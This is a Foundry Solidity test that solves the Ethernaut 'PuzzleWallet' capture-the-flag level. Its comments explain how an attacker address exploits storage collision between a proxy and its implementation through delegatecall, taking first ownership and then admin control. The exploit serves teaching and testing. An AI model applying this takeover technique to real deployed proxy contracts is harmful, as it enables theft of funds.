// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet puzzleWallet;
    PuzzleProxy proxy;

    address admin = makeAddr("admin");
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    address whitelist1 = makeAddr("1");
    address whitelist2 = makeAddr("2");
    address whitelist3 = makeAddr("3");

    function setUp() public {
        vm.startPrank(owner);
        puzzleWallet = new PuzzleWallet();
        bytes memory initData = abi.encodeWithSignature("init(uint256)", 50);
        proxy = new PuzzleProxy(address(0), address(puzzleWallet), initData);
        vm.stopPrank();
    }
    function test_Challenge24_Passed() public {
        vm.prank(attacker);
        proxy.proposeNewAdmin(attacker);
        // check if attacker has now become the owner
        assertEq(attacker, PuzzleWallet(address(proxy)).owner());

        // attacker will set him self at whitelist, since he's now the owner.
        vm.prank(attacker);
        PuzzleWallet(address(proxy)).addToWhitelist(attacker);

        // attacker can now setMaxBalance which then, in order to touch the implementation `maxBalance`.
        // ends up touching admin var in the proxy due to the behaviour of delegate call.
        vm.prank(attacker);
        PuzzleWallet(address(proxy)).setMaxBalance(uint256(uint160(attacker)));
        assertEq(proxy.admin(), attacker);
    }
}